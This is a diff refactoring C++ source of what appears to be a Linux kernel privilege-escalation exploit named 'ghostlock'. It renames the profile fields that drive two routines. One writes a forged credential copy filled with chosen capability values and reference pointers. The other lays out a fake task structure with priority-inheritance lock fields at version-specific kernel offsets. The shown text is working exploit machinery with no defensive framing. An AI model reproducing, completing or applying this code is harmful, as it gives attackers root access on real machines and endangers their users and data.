@@ -190,35 +190,35 @@ namespace ghostlock::support {
 
     static int32_t fill_profile_cred_copy(unsigned char *p, size_t off) {
         const profile::kernel_offsets *v = profile_values();
-        if (!v || !v->cred_copy_size || v->cred_copy_size > kernel::ORDER3_SIZE ||
-            v->cred_usage_offset + sizeof(uint32_t) > v->cred_copy_size ||
-            v->cred_caps_offset + v->cred_caps_count * sizeof(uint64_t) >
-            v->cred_copy_size) {
+        if (!v || !v->credential.copy_size || v->credential.copy_size > kernel::ORDER3_SIZE ||
+            v->credential.usage_offset + sizeof(uint32_t) > v->credential.copy_size ||
+            v->credential.caps_offset + v->credential.caps_count * sizeof(uint64_t) >
+            v->credential.copy_size) {
             pr_error("credential copy profile is incomplete\n");
             return 0;
         }
         unsigned char *c = p + off;
-        memset(c, 0, v->cred_copy_size);
-        put32(c, v->cred_usage_offset, v->cred_usage_value);
-        for (uint32_t i = 0; i < v->cred_caps_count; i++) {
-            put64(c, v->cred_caps_offset + i * sizeof(uint64_t), v->cred_caps_value);
+        memset(c, 0, v->credential.copy_size);
+        put32(c, v->credential.usage_offset, v->credential.usage_value);
+        for (uint32_t i = 0; i < v->credential.caps_count; i++) {
+            put64(c, v->credential.caps_offset + i * sizeof(uint64_t), v->credential.caps_value);
         }
 
         const std::array<uint32_t, 4> ref_offsets = {
-            v->cred_ref0_offset, v->cred_ref1_offset,
-            v->cred_ref2_offset, v->cred_ref3_offset,
+            v->credential.ref0_offset, v->credential.ref1_offset,
+            v->credential.ref2_offset, v->credential.ref3_offset,
         };
         const std::array<uint64_t, 4> ref_images = {
-            v->cred_ref0_image, v->cred_ref1_image,
-            v->cred_ref2_image, v->cred_ref3_image,
+            v->credential.ref0_image, v->credential.ref1_image,
+            v->credential.ref2_image, v->credential.ref3_image,
         };
-        if (v->cred_ref_count > ref_offsets.size()) {
+        if (v->credential.ref_count > ref_offsets.size()) {
             pr_error("credential reference count %u exceeds the %zu slots\n",
-                     v->cred_ref_count, ref_offsets.size());
+                     v->credential.ref_count, ref_offsets.size());
             return 0;
         }
-        for (size_t i = 0; i < v->cred_ref_count; i++) {
-            if (ref_offsets[i] + sizeof(uint64_t) > v->cred_copy_size) {
+        for (size_t i = 0; i < v->credential.ref_count; i++) {
+            if (ref_offsets[i] + sizeof(uint64_t) > v->credential.copy_size) {
                 pr_error("credential reference %zu exceeds configured copy size\n", i);
                 return 0;
             }
@@ -422,25 +422,25 @@ namespace ghostlock::support {
 
             /* Use runtime offsets for 6.1 compact; target.h constants for 6.6. */
             uint32_t ft_prio_off = compact
-                                       ? v->task_prio
+                                       ? v->task.prio
                                        : ghostlock::profile::fake_task_prio_off();
             uint32_t ft_nprio_off = compact
-                                        ? v->task_normal_prio
+                                        ? v->task.normal_prio
                                         : ghostlock::profile::fake_task_normal_prio_off();
             uint32_t ft_tg_off = compact
-                                     ? v->task_sched_task_group
+                                     ? v->task.sched_task_group
                                      : ghostlock::profile::fake_task_task_group_off();
             uint32_t ft_pi_lock_off = compact
-                                          ? v->task_pi_lock
+                                          ? v->task.pi_lock
                                           : ghostlock::profile::fake_task_pi_lock_off();
             uint32_t ft_pi_wait_off = compact
-                                          ? v->task_pi_waiters
+                                          ? v->task.pi_waiters
                                           : ghostlock::profile::fake_task_pi_waiters_off();
             uint32_t ft_pi_top_off = compact
-                                         ? v->task_pi_top_task
+                                         ? v->task.pi_top_task
                                          : ghostlock::profile::fake_task_pi_top_task_off();
             uint32_t ft_pi_blocked_off = compact
-                                             ? v->task_pi_blocked_on
+                                             ? v->task.pi_blocked_on
                                              : ghostlock::profile::fake_task_pi_blocked_on_off();
 
             put32(p, fake_task_off + kernel::FAKE_TASK_USAGE_OFF, 0x100);
